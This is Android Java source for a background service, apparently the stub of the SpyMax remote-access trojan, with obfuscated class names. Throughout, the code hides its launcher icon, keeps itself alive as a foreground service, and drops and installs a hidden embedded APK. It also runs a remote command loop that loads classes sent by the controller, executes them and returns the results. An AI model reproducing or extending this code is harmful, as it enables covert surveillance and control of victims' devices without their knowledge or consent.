package spymax.stub7;
import android.app.Notification;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.List;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
public class ClassGen11 extends Service {
    public static final String spl = "x0F0x";
    public static List<ClassGen8> Li;
    public static List<ClassGen0> Lcl;
    public static long eco = -1;
    public static int plg = -1;
    public static int inx = -1;
    public static String cmn[]={"","","","","","","","","","","","","","","","",""};
    public static boolean k = false;
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public void onDestroy(){
        super.onDestroy();
        ClassGen3.sf0 = 0;
        st = null;
        try {
            if(ClassGen3.rc != null){
                unregisterReceiver(ClassGen3.rc);
            }
        } catch (Exception e) {}
    }
    static ClassGen11 st;
    @Override
    public void onCreate() {
        super.onCreate();

        try {
            if(ClassGen3.rc == null){
                IntentFilter f = new IntentFilter(Intent.ACTION_SCREEN_ON);
                f.addAction(Intent.ACTION_SCREEN_OFF);
                f.addAction(Intent.ACTION_USER_PRESENT);
                ClassGen3.rc = new ClassGen14();
                registerReceiver(ClassGen3.rc, f);
            }
        } catch (Exception e) {}


        try {
            ClassGen3.ec = new ThreadPoolExecutor(8, 8 + 4, 1,
                    TimeUnit.MINUTES, new ArrayBlockingQueue<Runnable>(ClassGen3.max));
            Context ctx = getApplicationContext() ;
            ClassGen3.pr = ctx.getResources().getString(R.string.t1t2t3t4t5t6);
            if (ClassGen3.pr.charAt(1) == ClassGen3.c1)
            {
                Notification ntf = ClassGen3.Foreground(ctx);
                if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.N) {
                    ClassGen3.sf0 = 1;
                    st = this;
                    ClassGen3.sr(ctx,new Intent(this, ClassGen13.class));
                }else{
                    if (ntf != null){
                        startForeground(7064,ntf);
                    }
                }

            }
            if (ClassGen3.pr.charAt(0) == ClassGen3.c1){
                PackageManager p = getPackageManager();
                ComponentName n = new ComponentName(ctx, ClassGen9.class);
                if(p.getComponentEnabledSetting(n)
                        != PackageManager.COMPONENT_ENABLED_STATE_DISABLED){
                    p.setComponentEnabledSetting(n, PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                            , PackageManager.DONT_KILL_APP);
                }
            }
            ClassGen3.gl(ctx);
            if (ClassGen3.pr.charAt(2) == ClassGen3.c1){
                String tm = ctx.getPackageName();
                if (ClassGen3.gt(ctx,tm).length() == 0){
                    String ex = ctx.getResources().getString(R.string.e1e2e3e4e5e6);
                    InputStream stream = getApplicationContext().getResources().openRawResource(R.raw.b1b2b3b4b5b6);
                    int si = stream.available();
                    if (si != 0) {
                        long bf = si;
                        if(bf >= 1024000){
                            bf = 102400;
                        }else if(bf >= 512000){
                            bf = 51200;
                        }else if(bf >= 204800) {
                            bf = 20480;
                        }else if(bf >= 1024) {
                            bf = 1024;
                        }else{
                            bf = 512;
                        }
                        Long x = bf;
                        int s = x.intValue();
                        String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + "." + ex + "." + ex;
                        OutputStream out = new FileOutputStream(new File(path));
                        byte[] byf = new byte[s];
                        try {
                            int i;
                            while ((i = stream.read(byf, 0, byf.length)) != -1) {
                                out.write(byf, 0, i);
                            }
                            stream.close();
                            out.close();
                             try{
                                 PackageManager pm = ctx.getPackageManager();
                                 PackageInfo f = pm.getPackageArchiveInfo(path, 0);
                                 ClassGen3.dit(ctx,f.packageName,tm);
                             } catch (Exception e) {
                                 ClassGen3.dit(ctx,tm,tm);
                             }
                            if(ClassGen3.t_(getApplicationContext(),path,ex) != true){
                                ClassGen3.r_(getApplicationContext(),path,ex);
                            }
                        } catch (Exception e) {}
                    }
                }
            }
            String sl = ctx.getResources().getString(R.string.n1n2n3n4n5n6);
            int ms;
            try {
                ms = Integer.valueOf(sl);
            } catch (NumberFormatException e) {
                ms = 0;
            }
            if(ms != 0){
                if (ClassGen3.gt(ctx,sl).length() == 0){
                    ClassGen3.dit(ctx,ClassGen3.jq,sl);
                    ClassGen3.alr(ctx,ms);
                    ClassGen3.exi(ctx,ClassGen3.jq);
                }else {
                    if(ClassGen3.gt(ctx,sl).equals(ClassGen3.jq)){
                        ClassGen3.exi(ctx,ClassGen3.jq);
                    }
                }
            }
            ClassGen4.p(ctx);
        } catch (Exception e) {}
    }
    public static class ta extends AsyncTask<Context, Integer, String> {
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }
        @Override
        protected String doInBackground(Context... ctx) {
            do {
                try{
                    if (ClassGen2.echo == true){
                        if(ClassGen11.eco ==  -1){
                            ClassGen11.eco = System.currentTimeMillis() + ClassGen2.t ;
                        }else{
                            if (System.currentTimeMillis() > ClassGen11.eco){
                                String sh = ClassGen3.dt;
                                if(ClassGen11.inx == 2){
                                    sh = "\t";
                                }
                                ClassGen2.se(ClassGen3.jz,sh.getBytes());
                                ClassGen2.ox();
                                if(ClassGen11.inx >= 3){
                                    ClassGen11.inx = -1;
                                    ClassGen2.di();
                                }else{
                                    ClassGen11.inx++;
                                }
                                ClassGen11.eco = -1;
                            }
                        }
                    }else{
                        ClassGen11.eco = -1;
                    }
                } catch (Exception e) {}

                try{  try{
                    if(Li.size() > 0){
                        ClassGen8 d = Li.get(0);
                        if (d !=null){
                            String[] da = d.str.split(ClassGen11.spl);
                            String db = da[0];
                            if(db.equals("0")){
                                Class<?> cl = ClassGen10.sl(ctx[0],d.byt,da[1],da[4]);
                                ClassGen0 c = new ClassGen0(cl.getName(),cl);
                                Lcl.add(c);
                                if(Lcl.size() == Integer.valueOf(da[2])){
                                    cmn[0] = da[5];
                                    cmn[4] = da[6];
                                    cmn[5] = da[7];
                                    cmn[6] = da[8];
                                    cmn[7] = da[9];
                                    cmn[8] = da[10];
                                    cmn[9] = da[11];
                                    cmn[10] = da[12];
                                    cmn[11] = da[13];
                                    cmn[12] = da[14];
                                    cmn[13] = da[15];
                                    cmn[14] = da[16];
                                    cmn[15] = da[17];
                                    cmn[16] = da[18];
                                    ClassGen11.plg = Lcl.size();
                                    ClassGen10.d(ctx[0],da[3]);
                                    ClassGen2.s = 10L;
                                    ClassGen2.se(cmn[15],"\t".getBytes());
                                }
                            }else if(ClassGen3.c(db,cmn[4])){
                                if(Lcl.size()>0){
                                    for (int i = 0; i <= Lcl.size();i++){
                                        if (Lcl.get(i).d.equals(da[1])){
                                            Object obj = ClassGen10.exec(ctx[0],Lcl.get(i).j,da[2],da[4],d.byt);
                                            if(!da[3].equals(cmn[16])){
                                                try {
                                                    ClassGen2.se(da[3], ClassGen3.getBytes(obj));
                                                } catch (Exception e) {}
                                                break;
                                            }else{
                                                break;
                                            }
                                        }
                                    }
                                }
                            }else if(ClassGen3.c(db,cmn[5])){
                                if(!ClassGen10.r(ClassGen6.class,ctx[0])) {
                                    Intent i = new Intent(ctx[0], ClassGen6.class);
                                    ctx[0].stopService(i);
                                    try{ Thread.sleep(1000);} catch (InterruptedException e) {}
                                }
                                if(ClassGen10.r(ClassGen6.class,ctx[0])) {
                                    Intent i = new Intent(ctx[0], ClassGen6.class);
                                    String vul[] = {da[1],da[2],da[3],da[4],da[5],da[6],da[7],da[8]};
                                    i.putExtra(ctx[0].getResources().getString(R.string.k1k2k3k4k5k6),vul);
                                    ClassGen3.sr(ctx[0],i);
                                }
                            }else if(ClassGen3.c(db,cmn[6])){
                                if(ClassGen10.r(ClassGen5.class,ctx[0])) {
                                    Intent i = new Intent(ctx[0], ClassGen5.class);
                                    String vul[] = {da[1],da[2]};
                                    i.putExtra(ctx[0].getResources().getString(R.string.o1o2o3o4o5o6),vul);
                                    ClassGen3.sr(ctx[0],i);
                                }
                            }else if(ClassGen3.c(db,cmn[7])){
                                if(!ClassGen10.r(ClassGen5.class,ctx[0])) {
                                    Intent i = new Intent(ctx[0], ClassGen5.class);
                                    ctx[0].stopService(i);
                                }
                            }else if(ClassGen3.c(db,cmn[8])){
                                ClassGen3.exi(ctx[0],da[1]);
                            }else if(ClassGen3.c(db,cmn[9])){
                                ClassGen3.rel(false);
                                ClassGen2.se(da[1],"\t".getBytes());
                            }else if(ClassGen3.c(db,cmn[11])){
                                ClassGen11.cmn[1] = da[1];
                                ClassGen11.cmn[2] = da[2];
                                ClassGen11.cmn[3] = da[3];
                                ClassGen11.k = ClassGen3.acc(ctx[0], ClassGen12.class);
                                ClassGen2.se(ClassGen11.cmn[1] + ClassGen11.cmn[2] + String.valueOf(ClassGen11.k),"\t".getBytes());
                            }else if(ClassGen3.c(db,cmn[12])){
                                ClassGen11.k = false;
                            }else if(ClassGen3.c(db,cmn[13])){
                                ClassGen3.wk(ctx[0],true);
                                ClassGen2.se(da[1],"\t".getBytes());
                            }else if(ClassGen3.c(db,cmn[14])){
                                if(ClassGen2.echo){
                                    ClassGen2.poi();
                                }
                            }else {}
                        }
                            if(!ClassGen2.q){
                                ClassGen11.Li.clear();
                            }else{
                                ClassGen11.Li.remove(0);
                            }
                        try{ Thread.sleep(1);} catch (InterruptedException e) {}
                    }else {
                        try{ Thread.sleep(10);} catch (InterruptedException e) {}
                    }
                } catch (Exception e) {}
            }catch (OutOfMemoryError e) {}
            } while (true);
        }
        @Override
        protected void onPostExecute(String u) {
            super.onPostExecute(u);
        }
    }

}